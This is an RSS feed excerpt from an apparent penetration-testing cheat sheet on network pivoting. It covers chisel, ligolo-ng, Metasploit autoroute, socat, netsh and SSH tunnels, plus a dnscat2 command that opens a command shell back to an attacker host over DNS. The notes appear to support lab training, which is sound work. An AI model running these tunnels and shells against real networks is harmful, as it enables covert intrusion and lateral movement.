    <item>
      <title></title>
      <link>https://rusted-silver.github.io/spellbook/09.-pivoting/chisel/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://rusted-silver.github.io/spellbook/09.-pivoting/chisel/</guid>
      <description>&lt;h1 id=&#34;setup&#34;&gt;Setup&lt;a class=&#34;anchor&#34; href=&#34;#setup&#34;&gt;#&lt;/a&gt;&lt;/h1&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo apt update &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; sudo apt install chisel proxychains -y&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;proxychain&#34;&gt;Proxychain&lt;a class=&#34;anchor&#34; href=&#34;#proxychain&#34;&gt;#&lt;/a&gt;&lt;/h2&gt;&#xA;&lt;p&gt;Make sure &lt;code&gt;/etc/proxychains4.conf&lt;/code&gt; file&amp;rsquo;s content is like this:&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ tail -2 /etc/proxychains4.conf&#xA;socks5 127.0.0.1 1080&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;usage&#34;&gt;Usage&lt;a class=&#34;anchor&#34; href=&#34;#usage&#34;&gt;#&lt;/a&gt;&lt;/h1&gt;&#xA;&lt;h2 id=&#34;transfer-agent&#34;&gt;Transfer agent&lt;a class=&#34;anchor&#34; href=&#34;#transfer-agent&#34;&gt;#&lt;/a&gt;&lt;/h2&gt;&#xA;&lt;p&gt;Download &amp;ldquo;agent&amp;rdquo; from &lt;a href=&#34;https://github.com/jpillora/chisel/releases&#34;&gt;here&lt;/a&gt;. Depends on the OS and cpu architecture, download one. I said agent, but those are perfectly capable of acting as server.&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;wget https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_linux_amd64.gz&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;gzip -d ./chisel_1.10.1_linux_amd64.gz&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Transfer the agent to target machine&lt;/p&gt;&#xA;&lt;h2 id=&#34;open-reverse-tunnel-server-on-attacker&#34;&gt;Open reverse tunnel server on attacker&lt;a class=&#34;anchor&#34; href=&#34;#open-reverse-tunnel-server-on-attacker&#34;&gt;#&lt;/a&gt;&lt;/h2&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo chisel server --reverse&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;connect-back-to-attacker-using-agent&#34;&gt;Connect back to attacker using agent&lt;a class=&#34;anchor&#34; href=&#34;#connect-back-to-attacker-using-agent&#34;&gt;#&lt;/a&gt;&lt;/h2&gt;&#xA;&lt;p&gt;No privileges are required&lt;/p&gt;</description>
    </item>
    <item>
      <title></title>
      <link>https://rusted-silver.github.io/spellbook/09.-pivoting/dnscat2/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://rusted-silver.github.io/spellbook/09.-pivoting/dnscat2/</guid>
      <description>&lt;blockquote class=&#39;book-hint &#39;&gt;&#xA;&lt;p&gt;Is a tunneling tool that uses DNS protocol to create encrypted communication channel between two hosts. In other words, C2 via dns&lt;/p&gt;&#xA;&lt;/blockquote&gt;&lt;h1 id=&#34;setup&#34;&gt;Setup&lt;a class=&#34;anchor&#34; href=&#34;#setup&#34;&gt;#&lt;/a&gt;&lt;/h1&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo apt install dnscat2-server&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;run-dns-server&#34;&gt;Run dns server&lt;a class=&#34;anchor&#34; href=&#34;#run-dns-server&#34;&gt;#&lt;/a&gt;&lt;/h1&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;dnscat2-server --dns port&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;53,host&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;10.10.15.207,domain&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;wah.com --&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-powershell-session&#34; data-lang=&#34;powershell-session&#34;&gt;Start-Dnscat2 -DNSserver 10.10.15.207 -DNSPort 53 -Domain inlanefreight.local -PreSharedSecret be1eb0d437006daba66326ac28abbfef -Exec cmd&lt;/code&gt;&lt;/pre&gt;</description>
    </item>
    <item>
      <title></title>
      <link>https://rusted-silver.github.io/spellbook/09.-pivoting/ligolo-ng/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://rusted-silver.github.io/spellbook/09.-pivoting/ligolo-ng/</guid>
      <description>&lt;h1 id=&#34;setup&#34;&gt;Setup&lt;a class=&#34;anchor&#34; href=&#34;#setup&#34;&gt;#&lt;/a&gt;&lt;/h1&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo apt update &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; sudo apt install ligolo-ng -y&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo ligolo-proxy -selfcert&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;usage&#34;&gt;Usage&lt;a class=&#34;anchor&#34; href=&#34;#usage&#34;&gt;#&lt;/a&gt;&lt;/h1&gt;&#xA;&lt;h2 id=&#34;transfer-agent&#34;&gt;Transfer agent&lt;a class=&#34;anchor&#34; href=&#34;#transfer-agent&#34;&gt;#&lt;/a&gt;&lt;/h2&gt;&#xA;&lt;p&gt;Head to &lt;a href=&#34;https://github.com/nicocha30/ligolo-ng/releases&#34;&gt;here&lt;/a&gt; and download the agent. Depends on the OS and cpu architecture, download one. In my case, I&amp;rsquo;m using windows agent.&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_agent_0.8.2_windows_amd64.zip&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Transfer the agent to target machine&lt;/p&gt;&#xA;&lt;h2 id=&#34;open-reverse-tunnel-server-on-attacker&#34;&gt;Open reverse tunnel server on attacker&lt;a class=&#34;anchor&#34; href=&#34;#open-reverse-tunnel-server-on-attacker&#34;&gt;#&lt;/a&gt;&lt;/h2&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo ligolo-proxy -selfcert&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;connect-back-to-attacker-using-agent&#34;&gt;Connect back to attacker using agent&lt;a class=&#34;anchor&#34; href=&#34;#connect-back-to-attacker-using-agent&#34;&gt;#&lt;/a&gt;&lt;/h2&gt;&#xA;&lt;p&gt;No privileges are required&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;.&lt;span style=&#34;color:#ae81ff&#34;&gt;\a&lt;/span&gt;gent.exe -connect &amp;lt;attacker-ip&amp;gt;:11601 -ignore-cert&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;tunneling&#34;&gt;Tunneling&lt;a class=&#34;anchor&#34; href=&#34;#tunneling&#34;&gt;#&lt;/a&gt;&lt;/h2&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;ligolo-ng » interface_create --name &amp;#34;ligolo&amp;#34;&#xA;ligolo-ng » session&#xA;# Choose a session&#xA;tunnel_start --tun ligolo&#xA;ifconfig&#xA;interface_add_route --name ligolo --route 192.168.69.0/24&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;tunnel-to-targets-loopback-interface&#34;&gt;Tunnel to target&amp;rsquo;s loopback interface&lt;a class=&#34;anchor&#34; href=&#34;#tunnel-to-targets-loopback-interface&#34;&gt;#&lt;/a&gt;&lt;/h3&gt;&#xA;&lt;p&gt;If you query an IP address on the &lt;code&gt;240.0.0.0/4&lt;/code&gt; subnet, &lt;code&gt;Ligolo-ng&lt;/code&gt; will automatically redirect traffic to the agent&amp;rsquo;s loopback IP address&lt;/p&gt;</description>
    </item>
    <item>
      <title></title>
      <link>https://rusted-silver.github.io/spellbook/09.-pivoting/metasploit/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://rusted-silver.github.io/spellbook/09.-pivoting/metasploit/</guid>
      <description>&lt;blockquote class=&#39;book-hint &#39;&gt;&#xA;&lt;p&gt;We open a socks proxy on pivot box, after compromising it using a &lt;code&gt;meterpreter&lt;/code&gt; payload&lt;/p&gt;&#xA;&lt;/blockquote&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-msfconsole&#34; data-lang=&#34;msfconsole&#34;&gt;meterpreter &amp;gt; bg&#xA;use auxiliary/server/socks_proxy&#xA;set SRVPORT 9050&#xA;set SRVHOST 0.0.0.0&#xA;set version 4a&#xA;run&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;proxychains&lt;/code&gt; config:&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ tail -2 /etc/proxychains4.conf&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;socks4  127.0.0.1 &lt;span style=&#34;color:#ae81ff&#34;&gt;9050&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Create route&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-msfconsole&#34; data-lang=&#34;msfconsole&#34;&gt;use post/multi/manage/autoroute&#xA;set SESSION 1&#xA;set SUBNET 172.16.5.0&#xA;run&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;or, In the &lt;code&gt;meterpreter&lt;/code&gt; shell. Same thing&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-msfconsole&#34; data-lang=&#34;msfconsole&#34;&gt;meterpreter &amp;gt; run autoroute -s 172.16.5.0/23&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Now do things&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;proxychains nmap 172.16.5.19 -sT -v -Pn -F&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;port-forward&#34;&gt;Port forward&lt;a class=&#34;anchor&#34; href=&#34;#port-forward&#34;&gt;#&lt;/a&gt;&lt;/h1&gt;&#xA;&lt;h2 id=&#34;local&#34;&gt;Local&lt;a class=&#34;anchor&#34; href=&#34;#local&#34;&gt;#&lt;/a&gt;&lt;/h2&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;portfwd add -l &lt;span style=&#34;color:#ae81ff&#34;&gt;3300&lt;/span&gt; -r 172.16.5.19 -p &lt;span style=&#34;color:#ae81ff&#34;&gt;3389&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote class=&#39;book-hint &#39;&gt;&#xA;&lt;p&gt;It means attacker host&amp;rsquo;s port &lt;code&gt;3300&lt;/code&gt; is now internal host&amp;rsquo;s port &lt;code&gt;3389&lt;/code&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title></title>
      <link>https://rusted-silver.github.io/spellbook/09.-pivoting/port-forward/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://rusted-silver.github.io/spellbook/09.-pivoting/port-forward/</guid>
      <description>&lt;blockquote class=&#39;book-hint &#39;&gt;&#xA;&lt;p&gt;The pivot box will listen on 1 port and forward all traffics received on that port to the target host:port&lt;/p&gt;&#xA;&lt;/blockquote&gt;&lt;h1 id=&#34;socat&#34;&gt;Socat&lt;a class=&#34;anchor&#34; href=&#34;#socat&#34;&gt;#&lt;/a&gt;&lt;/h1&gt;&#xA;&lt;p&gt;Use on linux pivot box. If they have it.&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;netsh&#34;&gt;Netsh&lt;a class=&#34;anchor&#34; href=&#34;#netsh&#34;&gt;#&lt;/a&gt;&lt;/h1&gt;&#xA;&lt;p&gt;Use on windows host&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.235.175 connectport=445 connectaddress=172.16.5.5&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;verify&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;netsh.exe interface portproxy show v4tov4&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title></title>
      <link>https://rusted-silver.github.io/spellbook/09.-pivoting/ssh/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://rusted-silver.github.io/spellbook/09.-pivoting/ssh/</guid>
      <description>&lt;h1 id=&#34;port-forwards&#34;&gt;Port forwards&lt;a class=&#34;anchor&#34; href=&#34;#port-forwards&#34;&gt;#&lt;/a&gt;&lt;/h1&gt;&#xA;&lt;h2 id=&#34;dynamic-port-forward&#34;&gt;Dynamic port forward&lt;a class=&#34;anchor&#34; href=&#34;#dynamic-port-forward&#34;&gt;#&lt;/a&gt;&lt;/h2&gt;&#xA;&lt;blockquote class=&#39;book-hint &#39;&gt;&#xA;&lt;p&gt;Use when you want to connect from attacker host to internal host, via a pivot box (maybe an edge server with ssh)&#xA;Basically, you can think the ssh pivot box as our socks 4 proxy server.&lt;/p&gt;&#xA;&lt;/blockquote&gt;&lt;p&gt;Set ssh dynamic port forwarding&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ssh -D &lt;span style=&#34;color:#ae81ff&#34;&gt;9050&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$user&lt;span style=&#34;color:#e6db74&#34;&gt;@&lt;/span&gt;$target&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Set up &lt;code&gt;proxychains&lt;/code&gt;&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ tail -2 /etc/proxychains4.conf&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;socks4  127.0.0.1 &lt;span style=&#34;color:#ae81ff&#34;&gt;9050&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Run some random commands&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo proxychains nmap -sT -F --max-retries &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; $target&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote class=&#39;book-hint &#39;&gt;&#xA;&lt;p&gt;Yes, &lt;code&gt;-sT&lt;/code&gt;. You cannot use a half &lt;code&gt;SYN&lt;/code&gt; handshake here. You have to establish a full TCP handshake.&#xA;Also, yes, &lt;code&gt;sudo&lt;/code&gt;. For some reason, &lt;code&gt;nmap&lt;/code&gt; with normal user privilege doesn&amp;rsquo;t work so well with &lt;code&gt;proxychains&lt;/code&gt;&lt;/p&gt;</description>
    </item>
  </channel>
</rss>
